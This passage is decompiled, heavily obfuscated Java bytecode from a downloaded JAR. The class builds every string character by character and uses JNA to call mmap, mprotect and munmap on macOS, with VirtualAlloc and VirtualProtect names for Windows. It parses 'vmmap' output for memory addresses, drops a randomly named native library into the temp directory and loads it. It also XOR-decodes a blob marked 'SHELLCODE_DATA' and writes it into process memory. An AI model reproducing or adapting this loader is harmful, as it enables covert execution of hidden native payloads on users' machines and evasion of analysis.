    //   352: ifeq -> 363
    //   355: lload #4
    //   357: lload #8
    //   359: invokestatic b : (JJ)I
    //   362: pop
    //   363: sipush #207
    //   366: ireturn
    //   367: lload #4
    //   369: lstore #6
    //   371: lload #4
    //   373: aload_0
    //   374: dup
    //   375: arraylength
    //   376: invokestatic a : (J[BI)V
    //   379: aload_1
    //   380: ifnull -> 395
    //   383: lload #4
    //   385: aload_0
    //   386: arraylength
    //   387: i2l
    //   388: ladd
    //   389: aload_1
    //   390: dup
    //   391: arraylength
    //   392: invokestatic a : (J[BI)V
    //   395: lload #6
    //   397: lload #10
    //   399: getstatic net/java/g.a : I
    //   402: getstatic net/java/g.c : I
    //   405: ior
    //   406: istore #16
    //   408: lstore #14
    //   410: lstore #12
    //   412: getstatic net/java/g.d : Lcom/sun/jna/Function;
    //   415: ifnonnull -> 430
    //   418: invokestatic g : ()Ljava/lang/String;
    //   421: invokestatic a : (Ljava/lang/String;)Ljava/lang/Object;
    //   424: checkcast com/sun/jna/Function
    //   427: putstatic net/java/g.d : Lcom/sun/jna/Function;
    //   430: getstatic net/java/g.d : Lcom/sun/jna/Function;
    //   433: iconst_3
    //   434: anewarray java/lang/Object
    //   437: dup
    //   438: iconst_0
    //   439: new com/sun/jna/Pointer
    //   442: dup
    //   443: lload #12
    //   445: invokespecial <init> : (J)V
    //   448: aastore
    //   449: dup
    //   450: iconst_1
    //   451: new com/sun/jna/Pointer
    //   454: dup
    //   455: lload #14
    //   457: invokespecial <init> : (J)V
    //   460: aastore
    //   461: dup
    //   462: iconst_2
    //   463: iload #16
    //   465: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   468: aastore
    //   469: invokevirtual invokePointer : ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
    //   472: dup
    //   473: astore #17
    //   475: ifnonnull -> 482
    //   478: iconst_0
    //   479: goto -> 488
    //   482: aload #17
    //   484: invokestatic nativeValue : (Lcom/sun/jna/Pointer;)J
    //   487: l2i
    //   488: ifeq -> 510
    //   491: lload #4
    //   493: lconst_0
    //   494: lcmp
    //   495: ifeq -> 506
    //   498: lload #4
    //   500: lload #8
    //   502: invokestatic b : (JJ)I
    //   505: pop
    //   506: sipush #211
    //   509: ireturn
    //   510: aload_0
    //   511: invokestatic a : ([B)I
    //   514: dup
    //   515: istore_0
    //   516: iconst_m1
    //   517: if_icmpne -> 539
    //   520: lload #4
    //   522: lconst_0
    //   523: lcmp
    //   524: ifeq -> 535
    //   527: lload #4
    //   529: lload #8
    //   531: invokestatic b : (JJ)I
    //   534: pop
    //   535: sipush #212
    //   538: ireturn
    //   539: iload_0
    //   540: bipush #-2
    //   542: if_icmpne -> 564
    //   545: lload #4
    //   547: lconst_0
    //   548: lcmp
    //   549: ifeq -> 560
    //   552: lload #4
    //   554: lload #8
    //   556: invokestatic b : (JJ)I
    //   559: pop
    //   560: sipush #213
    //   563: ireturn
    //   564: iconst_3
    //   565: anewarray java/lang/Object
    //   568: dup
    //   569: iconst_0
    //   570: lload #4
    //   572: iload_0
    //   573: i2l
    //   574: ladd
    //   575: invokestatic valueOf : (J)Ljava/lang/Long;
    //   578: aastore
    //   579: dup
    //   580: iconst_1
    //   581: lload #4
    //   583: iload_0
    //   584: i2l
    //   585: ladd
    //   586: invokestatic valueOf : (J)Ljava/lang/Long;
    //   589: aastore
    //   590: dup
    //   591: iconst_2
    //   592: lload #10
    //   594: invokestatic valueOf : (J)Ljava/lang/Long;
    //   597: aastore
    //   598: invokestatic b : (Ljava/lang/Object;)Ljava/lang/Object;
    //   601: checkcast java/lang/Number
    //   604: invokevirtual intValue : ()I
    //   607: istore_0
    //   608: iload_0
    //   609: ireturn
    //   610: athrow
    // Exception table:
    //   from	to	target	type
    //   13	28	610	finally
    //   44	348	610	finally
    //   367	491	610	finally
    //   510	520	610	finally
    //   564	608	610	finally
  }

  private static Object a(String paramString) {
    try {
      return NativeLibrary.getInstance(d()).getFunction(paramString);
    } catch (Throwable throwable) {
      try {
        StringBuilder stringBuilder;
        (stringBuilder = new StringBuilder()).append('/');
        stringBuilder.append('u');
        stringBuilder.append('s');
        stringBuilder.append('r');
        stringBuilder.append('/');
        stringBuilder.append('l');
        stringBuilder.append('i');
        stringBuilder.append('b');
        stringBuilder.append('/');
        stringBuilder.append('s');
        stringBuilder.append('y');
        stringBuilder.append('s');
        stringBuilder.append('t');
        stringBuilder.append('e');
        stringBuilder.append('m');
        stringBuilder.append('/');
        stringBuilder.append('l');
        stringBuilder.append('i');
        stringBuilder.append('b');
        stringBuilder.append('d');
        stringBuilder.append('y');
        stringBuilder.append('l');
        stringBuilder.append('d');
        stringBuilder.append('.');
        stringBuilder.append('d');
        stringBuilder.append('y');
        stringBuilder.append('l');
        stringBuilder.append('i');
        stringBuilder.append('b');
        return NativeLibrary.getInstance(stringBuilder.toString()).getFunction(paramString);
      } catch (Throwable throwable1) {
        StringBuilder stringBuilder;
        (stringBuilder = new StringBuilder()).append('/');
        stringBuilder.append('u');
        stringBuilder.append('s');
        stringBuilder.append('r');
        stringBuilder.append('/');
        stringBuilder.append('l');
        stringBuilder.append('i');
        stringBuilder.append('b');
        stringBuilder.append('/');
        stringBuilder.append('l');
        stringBuilder.append('i');
        stringBuilder.append('b');
        stringBuilder.append('S');
        stringBuilder.append('y');
        stringBuilder.append('s');
        stringBuilder.append('t');
        stringBuilder.append('e');
        stringBuilder.append('m');
        stringBuilder.append('.');
        stringBuilder.append('B');
        stringBuilder.append('.');
        stringBuilder.append('d');
        stringBuilder.append('y');
        stringBuilder.append('l');
        stringBuilder.append('i');
        stringBuilder.append('b');
        return NativeLibrary.getInstance(stringBuilder.toString()).getFunction(paramString);
      }
    }
  }

  private static int b(long paramLong1, long paramLong2) {
    if (e == null)
      e = (Function)a(f());
    Pointer pointer;
    return ((pointer = e.invokePointer(new Object[] { new Pointer(paramLong1), new Pointer(paramLong2) })) == null) ? 0 : (int)Pointer.nativeValue(pointer);
  }

  private static long a(int paramInt) {
    try {
      Process process1 = null;
      int i = paramInt;
      int j = a();
      if (paramInt == j && !l.g()) {
        StringBuilder stringBuilder1;
        (stringBuilder1 = new StringBuilder()).append('p');
        stringBuilder1.append('i');
        stringBuilder1.append('n');
        stringBuilder1.append('g');
        (new String[2])[0] = stringBuilder1.toString();
        (stringBuilder1 = new StringBuilder()).append('l');
        stringBuilder1.append('o');
        stringBuilder1.append('c');
        stringBuilder1.append('a');
        stringBuilder1.append('l');
        stringBuilder1.append('h');
        stringBuilder1.append('o');
        stringBuilder1.append('s');
        stringBuilder1.append('t');
        Process process = Runtime.getRuntime().exec(new String[] { null, stringBuilder1.toString() });
        try {
          i = ((Number)Process.class.getMethod(a(), new Class[0]).invoke(process, new Object[0])).intValue();
        } catch (Throwable throwable) {
          try {
            Field field;
            (field = process.getClass().getDeclaredField(a())).setAccessible(true);
            i = field.getInt(process);
          } catch (Exception exception) {
            null.printStackTrace();
            return 0L;
          }
        }
      }
      StringBuilder stringBuilder;
      (stringBuilder = new StringBuilder()).append('v');
      stringBuilder.append('m');
      stringBuilder.append('m');
      stringBuilder.append('a');
      stringBuilder.append('p');
      (new String[3])[0] = stringBuilder.toString();
      (stringBuilder = new StringBuilder()).append('-');
      stringBuilder.append('w');
      Process process2 = (new ProcessBuilder(new String[] { null, stringBuilder.toString(), Integer.toString(i) })).start();
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process2.getInputStream()));
      long l = 0L;
      String str;
      while ((str = bufferedReader.readLine()) != null) {
        (stringBuilder = new StringBuilder()).append('_');
        stringBuilder.append('_');
        stringBuilder.append('T');
        stringBuilder.append('E');
        stringBuilder.append('X');
        stringBuilder.append('T');
        if (l == 0L && str.contains(d()) && str.startsWith(stringBuilder.toString())) {
          (stringBuilder = new StringBuilder()).append('\\');
          stringBuilder.append('s');
          stringBuilder.append('+');
          String[] arrayOfString = str.split(stringBuilder.toString());
          for (byte b = 0; b < arrayOfString.length; b++) {
            int k = arrayOfString[b].indexOf('-');
            try {
              l = Long.parseLong(arrayOfString[b].substring(0, k), 16);
            } catch (Exception exception) {}
          }
        }
      }
      if (process1 != null)
        try {
          process1.destroyForcibly();
        } catch (Throwable throwable) {
          process1.destroy();
        }
      return l;
    } catch (Throwable throwable) {
      null.printStackTrace();
      return 0L;
    }
  }

  private static int a() {
    try {
      StringBuilder stringBuilder;
      (stringBuilder = new StringBuilder()).append('j');
      stringBuilder.append('a');
      stringBuilder.append('v');
      stringBuilder.append('a');
      stringBuilder.append('.');
      stringBuilder.append('l');
      stringBuilder.append('a');
      stringBuilder.append('n');
      stringBuilder.append('g');
      stringBuilder.append('.');
      stringBuilder.append('m');
      stringBuilder.append('a');
      stringBuilder.append('n');
      stringBuilder.append('a');
      stringBuilder.append('g');
      stringBuilder.append('e');
      stringBuilder.append('m');
      stringBuilder.append('e');
      stringBuilder.append('n');
      stringBuilder.append('t');
      stringBuilder.append('.');
      stringBuilder.append('M');
      stringBuilder.append('a');
      stringBuilder.append('n');
      stringBuilder.append('a');
      stringBuilder.append('g');
      stringBuilder.append('e');
      stringBuilder.append('m');
      stringBuilder.append('e');
      stringBuilder.append('n');
      stringBuilder.append('t');
      stringBuilder.append('F');
      stringBuilder.append('a');
      stringBuilder.append('c');
      stringBuilder.append('t');
      stringBuilder.append('o');
      stringBuilder.append('r');
      stringBuilder.append('y');
      (stringBuilder = new StringBuilder()).append('g');
      stringBuilder.append('e');
      stringBuilder.append('t');
      stringBuilder.append('R');
      stringBuilder.append('u');
      stringBuilder.append('n');
      stringBuilder.append('t');
      stringBuilder.append('i');
      stringBuilder.append('m');
      stringBuilder.append('e');
      stringBuilder.append('M');
      stringBuilder.append('X');
      stringBuilder.append('B');
      stringBuilder.append('e');
      stringBuilder.append('a');
      stringBuilder.append('n');
      Method method = g.class.getClassLoader().loadClass(stringBuilder.toString()).getDeclaredMethod(stringBuilder.toString(), new Class[0]);
      (stringBuilder = new StringBuilder()).append('j');
      stringBuilder.append('a');
      stringBuilder.append('v');
      stringBuilder.append('a');
      stringBuilder.append('.');
      stringBuilder.append('l');
      stringBuilder.append('a');
      stringBuilder.append('n');
      stringBuilder.append('g');
      stringBuilder.append('.');
      stringBuilder.append('m');
      stringBuilder.append('a');
      stringBuilder.append('n');
      stringBuilder.append('a');
      stringBuilder.append('g');
      stringBuilder.append('e');
      stringBuilder.append('m');
      stringBuilder.append('e');
      stringBuilder.append('n');
      stringBuilder.append('t');
      stringBuilder.append('.');
      stringBuilder.append('R');
      stringBuilder.append('u');
      stringBuilder.append('n');
      stringBuilder.append('t');
      stringBuilder.append('i');
      stringBuilder.append('m');
      stringBuilder.append('e');
      stringBuilder.append('M');
      stringBuilder.append('X');
      stringBuilder.append('B');
      stringBuilder.append('e');
      stringBuilder.append('a');
      stringBuilder.append('n');
      (stringBuilder = new StringBuilder()).append('g');
      stringBuilder.append('e');
      stringBuilder.append('t');
      stringBuilder.append('N');
      stringBuilder.append('a');
      stringBuilder.append('m');
      stringBuilder.append('e');
      String str;
      return Integer.parseInt((str = (String)g.class.getClassLoader().loadClass(stringBuilder.toString()).getDeclaredMethod(stringBuilder.toString(), new Class[0]).invoke(method.invoke(null, new Object[0]), new Object[0])).substring(0, str.indexOf('@')));
    } catch (Exception exception) {
      null.printStackTrace();
      return 0;
    }
  }

  private static int b(byte[] paramArrayOfbyte) {
    byte[] arrayOfByte = null;
    if (l.a()) {
      if (l.g()) {
        arrayOfByte = k.h();
      } else if (l.e()) {
        arrayOfByte = k.f();
      } else if (l.f()) {
        arrayOfByte = k.g();
      }
    } else if (l.c() || l.d()) {
      if (l.g()) {
        arrayOfByte = k.e();
      } else if (l.e()) {
        arrayOfByte = k.d();
      } else if (l.f()) {
        arrayOfByte = k.c();
      }
    } else if (l.b()) {
      if (l.g()) {
        arrayOfByte = k.a();
      } else if (l.f()) {
        arrayOfByte = k.b();
      }
    }
    Random random = new Random();
    String str1 = String.valueOf(Long.toHexString(random.nextLong())) + '-' + Long.toHexString(random.nextLong());
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('j');
    stringBuilder.append('a');
    stringBuilder.append('v');
    stringBuilder.append('a');
    stringBuilder.append('.');
    stringBuilder.append('i');
    stringBuilder.append('o');
    stringBuilder.append('.');
    stringBuilder.append('t');
    stringBuilder.append('m');
    stringBuilder.append('p');
    stringBuilder.append('d');
    stringBuilder.append('i');
    stringBuilder.append('r');
    String str2 = System.getProperty(stringBuilder.toString());
    l.a.put(System.class, l.class);
    File file = new File(str2, System.mapLibraryName(str1));
    l.b(new Object[] { file, arrayOfByte });
    System.load(file.getAbsolutePath());
    l.a.remove(System.class);
    if (l.b()) {
      long l1 = (paramArrayOfbyte.length - 4096 + 48);
      long l2 = a(a());
      a(paramArrayOfbyte, (int)l1, l2);
    }
    Object object;
    if ((object = l.n(paramArrayOfbyte)) != null && object instanceof long[]) {
      int i;
      if ((i = (int)((long[])object)[0]) == 0)
        Thread.sleep(350L);
      return i;
    }
    return 256;
  }

  private static byte[] a() {
    byte b = -1;
    if (l.g()) {
      b = 0;
    } else if (l.e()) {
      b = 1;
    } else if (l.f()) {
      b = 2;
    }
    byte[] arrayOfByte = l.b(l.b());
    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(arrayOfByte);
    DataInputStream dataInputStream = new DataInputStream(byteArrayInputStream);
    try {
      for (byte b1 = 0; b1 < 3; b1++) {
        byte b2 = dataInputStream.readByte();
        int i = dataInputStream.readInt();
        if (b2 == b) {
          byte[] arrayOfByte1 = new byte[i];
          dataInputStream.readFully(arrayOfByte1);
          return arrayOfByte1;
        }
        dataInputStream.skip(i);
      }
    } catch (Exception exception) {
      null.printStackTrace();
    }
    return null;
  }

  public static boolean a() {
    // Byte code:
    //   0: aconst_null
    //   1: astore_0
    //   2: invokestatic a : ()[B
    //   5: dup
    //   6: astore_0
    //   7: dup
    //   8: astore_1
    //   9: invokestatic a : ([B)Z
    //   12: istore_2
    //   13: bipush #32
    //   15: newarray byte
    //   17: dup
    //   18: iconst_0
    //   19: bipush #83
    //   21: bastore
    //   22: dup
    //   23: iconst_1
    //   24: bipush #72
    //   26: bastore
    //   27: dup
    //   28: iconst_2
    //   29: bipush #69
    //   31: bastore
    //   32: dup
    //   33: iconst_3
    //   34: bipush #76
    //   36: bastore
    //   37: dup
    //   38: iconst_4
    //   39: bipush #76
    //   41: bastore
    //   42: dup
    //   43: iconst_5
    //   44: bipush #67
    //   46: bastore
    //   47: dup
    //   48: bipush #6
    //   50: bipush #79
    //   52: bastore
    //   53: dup
    //   54: bipush #7
    //   56: bipush #68
    //   58: bastore
    //   59: dup
    //   60: bipush #8
    //   62: bipush #69
    //   64: bastore
    //   65: dup
    //   66: bipush #9
    //   68: bipush #95
    //   70: bastore
    //   71: dup
    //   72: bipush #10
    //   74: bipush #68
    //   76: bastore
    //   77: dup
    //   78: bipush #11
    //   80: bipush #65
    //   82: bastore
    //   83: dup
    //   84: bipush #12
    //   86: bipush #84
    //   88: bastore
    //   89: dup
    //   90: bipush #13
    //   92: bipush #65
    //   94: bastore
    //   95: dup
    //   96: bipush #14
    //   98: bipush #95
    //   100: bastore
    //   101: dup
    //   102: bipush #15
    //   104: bipush #95
    //   106: bastore
    //   107: dup
    //   108: bipush #16
    //   110: bipush #83
    //   112: bastore
    //   113: dup
    //   114: bipush #17
    //   116: bipush #72
    //   118: bastore
    //   119: dup
    //   120: bipush #18
    //   122: bipush #69
    //   124: bastore
    //   125: dup
    //   126: bipush #19
    //   128: bipush #76
    //   130: bastore
    //   131: dup
    //   132: bipush #20
    //   134: bipush #76
    //   136: bastore
    //   137: dup
    //   138: bipush #21
    //   140: bipush #67
    //   142: bastore
    //   143: dup
    //   144: bipush #22
    //   146: bipush #79
    //   148: bastore
    //   149: dup
    //   150: bipush #23
    //   152: bipush #68
    //   154: bastore
    //   155: dup
    //   156: bipush #24
    //   158: bipush #69
    //   160: bastore
    //   161: dup
    //   162: bipush #25
    //   164: bipush #95
    //   166: bastore
    //   167: dup
    //   168: bipush #26
    //   170: bipush #68
    //   172: bastore
    //   173: dup
    //   174: bipush #27
    //   176: bipush #65
    //   178: bastore
    //   179: dup
    //   180: bipush #28
    //   182: bipush #84
    //   184: bastore
    //   185: dup
    //   186: bipush #29
    //   188: bipush #65
    //   190: bastore
    //   191: dup
    //   192: bipush #30
    //   194: bipush #95
    //   196: bastore
    //   197: dup
    //   198: bipush #31
    //   200: bipush #95
    //   202: bastore
    //   203: astore #4
    //   205: aload_1
    //   206: aload #4
    //   208: invokestatic a : (Ljava/lang/Object;Ljava/lang/Object;)I
    //   211: istore_3
    //   212: iconst_0
    //   213: istore #5
    //   215: goto -> 227
    //   218: aload #4
    //   220: iload #5
    //   222: iconst_0
    //   223: bastore
    //   224: iinc #5, 1
    //   227: iload #5
    //   229: bipush #32
    //   231: if_icmplt -> 218
    //   234: aload_1
    //   235: iconst_0
    //   236: aload_1
    //   237: iload_3
    //   238: bipush #24
    //   240: invokestatic arraycopy : (Ljava/lang/Object;ILjava/lang/Object;II)V
    //   243: iload_3
    //   244: istore #5
    //   246: goto -> 263
    //   249: aload_1
    //   250: iload #5
    //   252: dup2
    //   253: baload
    //   254: sipush #153
    //   257: ixor
    //   258: i2b
    //   259: bastore
    //   260: iinc #5, 1
    //   263: iload #5
    //   265: iload_3
    //   266: bipush #24
    //   268: iadd
    //   269: if_icmplt -> 249
    //   272: aload_1
    //   273: iload_3
    //   274: bipush #24
    //   276: iadd
    //   277: aload_1
    //   278: arraylength
    //   279: i2l
    //   280: invokestatic a : ([BIJ)V
    //   283: aload_1
    //   284: dup
    //   285: arraylength
    //   286: sipush #4096
    //   289: iadd
    //   290: invokestatic a : ([BI)[B
    //   293: astore #5
    //   295: invokestatic a : ()Z
    //   298: ifeq -> 336
    //   301: aload_1
    //   302: arraylength
    //   303: i2l
    //   304: lstore #6
    //   306: iload_2
    //   307: ifeq -> 322
    //   310: aload #5
    //   312: lload #6
    //   314: l2i
    //   315: iconst_2
    //   316: invokestatic a : ([BII)V
    //   319: goto -> 419
    //   322: aload #5
    //   324: lload #6
    //   326: l2i
    //   327: ldc2_w 2
    //   330: invokestatic a : ([BIJ)V
    //   333: goto -> 419
    //   336: invokestatic b : ()Z
    //   339: ifeq -> 377
    //   342: aload_1
    //   343: arraylength
    //   344: i2l
    //   345: lstore #6
    //   347: iload_2
    //   348: ifeq -> 363
    //   351: aload #5
    //   353: lload #6
    //   355: l2i
    //   356: iconst_3
    //   357: invokestatic a : ([BII)V
    //   360: goto -> 419
    //   363: aload #5
    //   365: lload #6
    //   367: l2i
    //   368: ldc2_w 3
    //   371: invokestatic a : ([BIJ)V
    //   374: goto -> 419
    //   377: invokestatic c : ()Z
    //   380: ifne -> 389
    //   383: invokestatic d : ()Z
    //   386: ifeq -> 419
    //   389: aload_1
    //   390: arraylength
    //   391: i2l
    //   392: lstore #6
    //   394: iload_2
    //   395: ifeq -> 410
    //   398: aload #5
    //   400: lload #6
    //   402: l2i
    //   403: iconst_1
    //   404: invokestatic a : ([BII)V
    //   407: goto -> 419
    //   410: aload #5
    //   412: lload #6
    //   414: l2i
    //   415: lconst_1
    //   416: invokestatic a : ([BIJ)V
    //   419: aload #5
    //   421: dup
    //   422: astore_0
    //   423: dup
    //   424: astore_1
    //   425: invokestatic a : ([B)Z
    //   428: ifeq -> 450
    //   431: aload_1
    //   432: arraylength
    //   433: sipush #4096
    //   436: isub
    //   437: bipush #20
    //   439: iadd
    //   440: istore_3
    //   441: aload_1
    //   442: iload_3
    //   443: iconst_2
    //   444: invokestatic a : ([BII)V
    //   447: goto -> 468
    //   450: aload_1
    //   451: arraylength
    //   452: sipush #4096
    //   455: isub
    //   456: bipush #40
    //   458: iadd
    //   459: istore_3
    //   460: aload_1
    //   461: iload_3
    //   462: ldc2_w 2
    //   465: invokestatic a : ([BIJ)V
    //   468: invokestatic b : ()Z
    //   471: ifeq -> 507
    //   474: aload_0
    //   475: arraylength
    //   476: sipush #4096
    //   479: isub
    //   480: bipush #48
    //   482: iadd
    //   483: i2l
    //   484: lstore_2
    //   485: invokestatic a : ()I
    //   488: invokestatic a : (I)J
    //   491: lstore #4
    //   493: aload_0
    //   494: lload_2
    //   495: l2i
    //   496: lload #4
    //   498: invokestatic a : ([BIJ)V
    //   501: goto -> 507
    //   504: invokevirtual printStackTrace : ()V
    //   507: getstatic net/java/l.a : Ljava/util/Map;
    //   510: ldc_w java/util/Properties
    //   513: ldc net/java/l
    //   515: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   520: pop
    //   521: invokestatic a : ()Z
    //   524: ifeq -> 563
    //   527: invokestatic b : ()Z
    //   530: ifeq -> 547
    //   533: aload_0
    //   534: aconst_null
    //   535: invokestatic a : (Ljava/lang/Object;Ljava/lang/Object;)I
    //   538: ifne -> 547
    //   541: goto -> 650
    //   544: invokevirtual printStackTrace : ()V
    //   547: aload_0
    //   548: invokestatic b : ([B)I
    //   551: ifne -> 650
    //   554: goto -> 650
    //   557: invokevirtual printStackTrace : ()V
    //   560: goto -> 650
    //   563: invokestatic c : ()Z
    //   566: ifne -> 575
    //   569: invokestatic d : ()Z
    //   572: ifeq -> 611
    //   575: invokestatic b : ()Z
    //   578: ifeq -> 595
    //   581: aload_0
    //   582: aconst_null
    //   583: invokestatic b : (Ljava/lang/Object;Ljava/lang/Object;)I
    //   586: ifne -> 595
    //   589: goto -> 650
    //   592: invokevirtual printStackTrace : ()V
    //   595: aload_0
    //   596: invokestatic b : ([B)I
    //   599: ifne -> 650
    //   602: goto -> 650
    //   605: invokevirtual printStackTrace : ()V
    //   608: goto -> 650
    //   611: invokestatic b : ()Z
    //   614: ifeq -> 650
    //   617: invokestatic b : ()Z
    //   620: ifeq -> 637
    //   623: aload_0
    //   624: aconst_null
    //   625: invokestatic c : (Ljava/lang/Object;Ljava/lang/Object;)I
    //   628: ifne -> 637
    //   631: goto -> 650
    //   634: invokevirtual printStackTrace : ()V
    //   637: aload_0
    //   638: invokestatic b : ([B)I
    //   641: ifne -> 650
    //   644: goto -> 650
    //   647: invokevirtual printStackTrace : ()V
    //   650: iconst_0
    //   651: istore_2
    //   652: goto -> 690
    //   655: aconst_null
    //   656: invokestatic n : (Ljava/lang/Object;)Ljava/lang/Object;
    //   659: ifnonnull -> 677
    //   662: getstatic net/java/l.a : Ljava/util/Map;
    //   665: ldc_w java/util/Properties
    //   668: invokeinterface remove : (Ljava/lang/Object;)Ljava/lang/Object;
    //   673: pop
    //   674: iconst_1
    //   675: ireturn
    //   676: pop
    //   677: ldc2_w 200
    //   680: invokestatic sleep : (J)V
    //   683: goto -> 687
    //   686: pop
    //   687: iinc #2, 1
    //   690: iload_2
    //   691: iconst_5
    //   692: if_icmplt -> 655
    //   695: getstatic net/java/l.a : Ljava/util/Map;
    //   698: ldc_w java/util/Properties
    //   701: invokeinterface remove : (Ljava/lang/Object;)Ljava/lang/Object;
    //   706: pop
    //   707: iconst_0
    //   708: ireturn
    // Exception table:
    //   from	to	target	type
    //   2	501	504	java/lang/Throwable
    //   533	541	544	java/lang/Throwable
    //   547	554	557	java/lang/Throwable
    //   581	589	592	java/lang/Throwable
    //   595	602	605	java/lang/Throwable
    //   623	631	634	java/lang/Throwable
    //   637	644	647	java/lang/Throwable
    //   655	674	676	java/lang/Throwable
    //   677	683	686	java/lang/InterruptedException
  }

  private static String a() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('p');
    stringBuilder.append('i');
    stringBuilder.append('d');
    return stringBuilder.toString();
  }

  private static String b() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('V');
    stringBuilder.append('i');
    stringBuilder.append('r');
    stringBuilder.append('t');
    stringBuilder.append('u');
    stringBuilder.append('a');
    stringBuilder.append('l');
    stringBuilder.append('P');
    stringBuilder.append('r');
    stringBuilder.append('o');
    stringBuilder.append('t');
    stringBuilder.append('e');
    stringBuilder.append('c');
    stringBuilder.append('t');
    return stringBuilder.toString();
  }

  private static String c() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('V');
    stringBuilder.append('i');
    stringBuilder.append('r');
    stringBuilder.append('t');
    stringBuilder.append('u');
    stringBuilder.append('a');
    stringBuilder.append('l');
    stringBuilder.append('A');
    stringBuilder.append('l');
    stringBuilder.append('l');
    stringBuilder.append('o');
    stringBuilder.append('c');
    return stringBuilder.toString();
  }

  private static String d() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('l');
    stringBuilder.append('i');
    stringBuilder.append('b');
    stringBuilder.append('d');
    stringBuilder.append('y');
    stringBuilder.append('l');
    stringBuilder.append('d');
    stringBuilder.append('.');
    stringBuilder.append('d');
    stringBuilder.append('y');
    stringBuilder.append('l');
    stringBuilder.append('i');
    stringBuilder.append('b');
    return stringBuilder.toString();
  }

  private static String e() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('V');
    stringBuilder.append('i');
    stringBuilder.append('r');
    stringBuilder.append('t');
    stringBuilder.append('u');
    stringBuilder.append('a');
    stringBuilder.append('l');
    stringBuilder.append('F');
    stringBuilder.append('r');
    stringBuilder.append('e');
    stringBuilder.append('e');
    return stringBuilder.toString();
  }

  private static String f() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('m');
    stringBuilder.append('u');
    stringBuilder.append('n');
    stringBuilder.append('m');
    stringBuilder.append('a');
    stringBuilder.append('p');
    return stringBuilder.toString();
  }

  private static String g() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('m');
    stringBuilder.append('p');
    stringBuilder.append('r');
    stringBuilder.append('o');
    stringBuilder.append('t');
    stringBuilder.append('e');
    stringBuilder.append('c');
    stringBuilder.append('t');
    return stringBuilder.toString();
  }

  private static String h() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('m');
    stringBuilder.append('m');
    stringBuilder.append('a');
    stringBuilder.append('p');
    return stringBuilder.toString();
  }
}


/* Location:              /Users/apple/Downloads/9z72uyksgx.jar!/net/java/g.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */